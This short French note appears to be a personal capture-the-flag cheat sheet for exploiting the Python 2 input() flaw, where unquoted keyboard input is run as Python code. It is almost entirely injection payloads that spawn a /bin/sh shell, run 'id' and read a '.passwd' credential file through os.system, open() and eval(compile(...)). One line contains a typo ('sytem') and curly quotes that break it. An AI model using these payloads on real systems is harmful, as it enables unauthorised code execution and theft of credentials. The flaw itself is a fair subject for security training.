__import__(’os’).execl(’/bin/sh’,’sh’)
sys.stdout.write(open(".passwd").readline())
import os; os.sytem("id")   
eval(compile('import os; os.system("cat .passwd")', 'foobar.py', 'exec'))

Faille input qui permet de lire l'entrée du clavier. s'il n'y a pas de '' ou "" alors ce sera interprété comme code python